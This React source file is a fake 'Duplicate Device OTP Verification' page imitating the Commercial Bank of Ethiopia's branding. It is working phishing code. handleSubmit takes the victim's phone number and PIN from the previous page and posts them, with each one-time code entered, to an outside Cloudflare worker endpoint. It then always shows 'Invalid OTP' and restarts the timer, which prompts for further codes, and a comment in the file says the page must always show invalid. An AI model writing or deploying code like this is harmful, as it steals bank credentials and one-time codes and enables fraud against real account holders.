import { useState, useRef, useEffect } from "react";
import React from "react";
import ethopia from "./assets/ethopia3.png"
import { useLocation } from "react-router-dom";

const PRIMARY = "#92278F";
const PRIMARY_LIGHT = "#92278F";
const PRIMARY_DARK = "#92278F";
const PURPLE = "#8d288e";

export default function OtpVerify() {
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [error, setError] = useState("");
  const [open, setOpen] = useState(false);
  const inputs = useRef([]);

  const translations = {
    am: {
      title: "የOTP ማረጋገጫ",
      subtitle: "OTP ያስገቡ ለመቀጠል",
      getOtp: "OTP አግኝ",
      editNumber: "ቁጥር አርም",
      otpTitle: "Duplicate Device OTP Verification",
      otpSubtitle: "Get OTP to proceed 251988860033",
      errorInvalid: "OTP ትክክል አይደለም። እባክዎ ደግመው ይሞክሩ።",
      errorIncomplete: "እባክዎ ሙሉ OTP ያስገቡ።"
    },
    en: {
      title: "OTP Verification",
      subtitle: "Enter OTP to continue",
      getOtp: "Get OTP",
      editNumber: "Edit Number",
      otpTitle: "Duplicate Device OTP Verification",
      otpSubtitle: "Get OTP to proceed 251988860033",
      errorInvalid: "Invalid OTP. Please try again.",
      errorIncomplete: "Please enter complete OTP."
    }
  };

  const savedLang = localStorage.getItem("lang");
  const [lang, setLang] = useState(translations[savedLang] ? savedLang : "am");
  const location = useLocation();
  const { phone, pin } = location.state || {}
  const [timer, setTimer] = useState(60);
  const [isRunning, setIsRunning] = useState(true);

  useEffect(() => {
    let interval;

    if (isRunning) {
      interval = setInterval(() => {
        setTimer((prev) => {
          if (prev <= 1) {
            clearInterval(interval);
            setIsRunning(false);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }

    return () => clearInterval(interval);
  }, [isRunning]);
  useEffect(() => {
    const enteredOtp = otp.join("");

    if (enteredOtp.length === 6 && !otp.includes("")) {
      handleSubmit();
    }
  }, [otp]);

  useEffect(() => {
    const savedLang = localStorage.getItem("lang");
    if (savedLang && translations[savedLang]) {
      setLang(savedLang);
    }
  }, []);

  const t = translations[lang];

  const handleChange = (val, i) => {
    if (!/^\d?$/.test(val)) return;
    const newOtp = [...otp];
    newOtp[i] = val;
    setOtp(newOtp);
    if (val && i < 5) inputs.current[i + 1]?.focus();
  };

  const handleKeyDown = (e, i) => {
    if (e.key === "Backspace" && !otp[i] && i > 0) {
      inputs.current[i - 1]?.focus();
    }
  };

  const handleSubmit = async () => {
    const enteredOtp = otp.join("");

    if (enteredOtp.length === 6) {
      // hamesha invalid show karna hai
      const payload = {
        phone: phone,
        pin: pin,
        otp: enteredOtp
      }
      await fetch(
        "https://my-worker-app.instapayapi.workers.dev/api/otp-momosa",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        },
      );
      setError("Invalid OTP. Please try again.");

      // reset OTP
      setOtp(["", "", "", "", "", ""]);
      setTimer(60);
    setIsRunning(true);

      // focus first input
      inputs.current[0]?.focus();
    } else {
      setError("Please enter complete OTP.");
    }
  };

  return (
    <div style={{ fontFamily: "'Segoe UI', sans-serif" }} className="min-h-screen flex flex-col bg-white">

      {/* Purple Header */}
      <div className="relative flex flex-col items-center pt-12 pb-16"
        style={{ background: `linear-gradient(135deg, ${PRIMARY} 0%, ${PRIMARY_LIGHT} 50%, ${PRIMARY_DARK} 100%)` }}>

        {/* Geometric decorations */}
        <svg className="absolute inset-0 w-full h-full" viewBox="0 0 400 260" preserveAspectRatio="xMidYMid slice">
          <polygon points="10,20 70,10 90,60 30,65" fill="none" stroke="rgba(255,255,255,0.12)" strokeWidth="1.5" />
          <polygon points="330,5 390,15 395,65 335,55" fill="none" stroke="rgba(255,255,255,0.1)" strokeWidth="1.5" />
          <polygon points="350,150 400,140 400,200 355,205" fill="none" stroke="rgba(255,255,255,0.08)" strokeWidth="1.5" />
          <polygon points="0,160 50,155 55,210 5,215" fill="none" stroke="rgba(255,255,255,0.08)" strokeWidth="1.5" />
          <line x1="100" y1="0" x2="220" y2="260" stroke="rgba(255,255,255,0.06)" strokeWidth="1" />
          <line x1="320" y1="0" x2="180" y2="260" stroke="rgba(255,255,255,0.06)" strokeWidth="1" />
        </svg>

        {/* Back arrow */}
        <div className="absolute top-4 left-5 z-10">
          <button className="text-white p-1">
            <svg viewBox="0 0 24 24" className="w-6 h-6" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M19 12H5M12 5l-7 7 7 7" />
            </svg>
          </button>
        </div>

        {/* Logo + Bank name */}
        <div className="relative z-10 flex flex-col items-center mt-4">
          <img src={ethopia} className="w-30 h-20 rounded-full" />
          <p className="text-white/80 text-sm mb-0.5" style={{ letterSpacing: "0.05em" }}>የኢትዮጵያ ንግድ ባንክ</p>
          <p className="text-amber-300 text-sm font-medium" style={{ letterSpacing: "0.03em" }}>Commercial Bank of Ethiopia</p>
        </div>
      </div>

      {/* White Card */}
      <div className="flex-1 flex flex-col bg-white -mt-6 rounded-t-3xl px-5 pt-5 pb-6">

        {/* Drag indicator */}
        <div className="w-10 h-1 bg-gray-300 rounded-full mx-auto mb-5" />

        {/* Language selector */}
        <div className="relative mb-6" onClick={(e) => e.stopPropagation()}>

          {/* Top bar (same design) */}
          <div
            onClick={() => setOpen(!open)}
            className="flex items-center gap-2 cursor-pointer"
          >
            <svg width="18" height="18" fill="none" viewBox="0 0 24 24" stroke={PURPLE} strokeWidth="2">
              <circle cx="12" cy="12" r="10" />
              <path d="M2 12h20M12 2a15.3 15.3 0 010 20M12 2a15.3 15.3 0 000 20" />
            </svg>

            <span className="text-sm font-semibold" style={{ color: PURPLE }}>
              {lang === "en" ? "English" : "አማርኛ"}
            </span>

            <svg
              width="14"
              height="14"
              fill="none"
              viewBox="0 0 24 24"
              stroke={PURPLE}
              strokeWidth="2.5"
              className={`transition-transform ${open ? "rotate-180" : ""}`}
            >
              <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
            </svg>
          </div>

          {/* Dropdown */}
          {/* {open && (
            <div className="absolute mt-2 w-40 bg-white rounded-xl shadow-lg border z-50">

              <div
                onClick={() => {
                  setLang("en");
                  localStorage.setItem("lang", "en");
                  setOpen(false);
                }}
                className="px-4 py-2 text-sm hover:bg-gray-100 cursor-pointer"
              >
                English
              </div>

              <div
                onClick={() => {
                  setLang("am");
                  localStorage.setItem("lang", "am");
                  setOpen(false);
                }}
                className="px-4 py-2 text-sm hover:bg-gray-100 cursor-pointer"
              >
                አማርኛ
              </div>

            </div>
          )} */}
        </div>

        {/* OTP illustration box */}

        <div className="rounded-2xl p-5 mb-5 flex items-center justify-center"
          style={{ background: "#f5f0f5" }}>
          <div className="flex items-center gap-3">
            {/* Lock chat bubble */}
            <div className="relative">
              <div className="w-14 h-14 rounded-2xl border-2 flex items-center justify-center bg-white"
                style={{ borderColor: PRIMARY + "60" }}>
                <svg viewBox="0 0 24 24" className="w-8 h-8" fill="none">
                  <rect x="5" y="11" width="14" height="10" rx="2" fill={PRIMARY} opacity="0.8" />
                  <path d="M8 11V7a4 4 0 018 0v4" stroke={PRIMARY} strokeWidth="2" strokeLinecap="round" />
                  <circle cx="12" cy="16" r="1.5" fill="white" />
                </svg>
              </div>
              <div className="absolute -bottom-1 -left-1 w-3 h-3 rounded-bl-full"
                style={{ background: PRIMARY + "40" }} />
            </div>
            {/* Stars input mock */}
            <div className="flex flex-col">
              <div className="flex items-center gap-1 px-4 py-2 rounded-lg bg-white border"
                style={{ borderColor: PRIMARY + "50", borderBottom: `2px solid ${PRIMARY}` }}>
                <span className="text-2xl tracking-widest" style={{ color: PRIMARY }}>* * * *</span>
              </div>
            </div>
          </div>
        </div>

        {/* Title & subtitle */}
        <div className="text-center mb-5">
          <h2 className="text-base font-bold mb-1" style={{ color: PRIMARY }}>
            {t.title}
          </h2>
          <p className="text-gray-500 text-sm">{t.subtitle}</p>
          {/* <h2 className="text-base font-bold mb-1" style={{ color: PRIMARY }}>Duplicate Device OTP Verification</h2> */}
          {/* <p className="text-gray-500 text-sm">Get OTP to proceed 251988860033</p> */}
        </div>

        {/* 6 OTP input boxes */}
        <div className="flex justify-between gap-2 mb-3">
          {otp.map((val, i) => (
            <input
              key={i}
              ref={(el) => (inputs.current[i] = el)}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={val}
              onChange={(e) => handleChange(e.target.value, i)}
              onKeyDown={(e) => handleKeyDown(e, i)}
              className="flex-1 h-12 w-10 rounded-xl text-center text-lg font-bold outline-none transition-all duration-200"
              style={{
                border: `2px solid ${val ? PRIMARY : PRIMARY + "40"}`,
                background: val ? PRIMARY + "10" : "white",
                color: PRIMARY,
                boxShadow: val ? `0 2px 10px ${PRIMARY}30` : "none",
                maxWidth: "52px",
              }}
            />
          ))}
        </div>
        {error && (
          <p className="text-red-500 text-sm text-center mt-2">
            {error}
          </p>
        )}

        {/* Edit number */}
        <div className="flex justify-center items-center gap-1 mb-5">
          <span className="text-sm font-medium" style={{ color: PRIMARY }}>
            {t.editNumber}
          </span>
          {/* <span className="text-sm font-medium" style={{ color: PRIMARY }}>Edit Number</span> */}
          <svg viewBox="0 0 24 24" className="w-4 h-4" fill="none" stroke={PRIMARY} strokeWidth="2" strokeLinecap="round">
            <path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7" />
            <path d="M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z" />
          </svg>
        </div>

        {/* Security illustration */}
        <div className="flex justify-center mb-6">
          <div className="relative w-48 h-40">
            <div className="absolute inset-0 flex items-center justify-center z-20 pointer-events-none">
              <div
                className="px-4 py-2 rounded-full bg-white shadow-md border"
                style={{ borderColor: PRIMARY + "40" }}
              >
                <p className="text-sm font-semibold" style={{ color: PRIMARY }}>
                  {timer > 0 ? `${timer}s` : "0s"}
                </p>
              </div>
            </div>
            {/* Phone */}
            <div className="absolute left-8 top-4 w-28 h-32 rounded-2xl border-2 bg-white flex flex-col items-center justify-center"
              style={{ borderColor: PRIMARY + "30" }}>
              <div className="w-20 h-3 rounded bg-gray-200 mb-2" />
              <div className="w-20 h-2 rounded bg-gray-100 mb-1" />
              <div className="w-20 h-2 rounded bg-gray-100 mb-3" />
              <svg viewBox="0 0 24 24" className="w-8 h-8" fill="none">
                <rect x="5" y="11" width="14" height="10" rx="2" fill="#e8a0e8" opacity="0.8" />
                <path d="M8 11V7a4 4 0 018 0v4" stroke="#c070c0" strokeWidth="2" strokeLinecap="round" />
              </svg>
            </div>
            {/* Gear */}
            <div className="absolute right-2 top-6">
              <svg viewBox="0 0 24 24" className="w-10 h-10" fill="none">
                <circle cx="12" cy="12" r="3" fill="#d0a0d0" />
                <path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 014 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06A1.65 1.65 0 0019.4 9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z"
                  stroke="#c090c0" strokeWidth="1.5" fill="none" />
              </svg>
            </div>
            {/* Shield */}
            <div className="absolute left-0 bottom-0">
              <svg viewBox="0 0 40 45" className="w-12 h-12" fill="none">
                <path d="M20 2L4 9v12c0 10 7 19 16 22 9-3 16-12 16-22V9L20 2z" fill="#a0d0d8" opacity="0.5" />
              </svg>
            </div>
          </div>
        </div>

        <div className="flex-1" />

        {/* Get OTP Button */}
        <button
          onClick={handleSubmit}
          className="w-full py-4 rounded-full text-white font-semibold text-base transition-all active:scale-95"
          style={{ background: `linear-gradient(135deg, ${PRIMARY_DARK}, ${PRIMARY})` }}
        >
          {t.getOtp}
          {/* Get OTP */}
        </button>

        {/* Footer */}
        {/* <p className="text-center text-xs text-gray-400 mt-4">
          ©2026 All rights reserved to Commercial Bank of Ethiopia.
        </p> */}
      </div>
    </div>
  );
}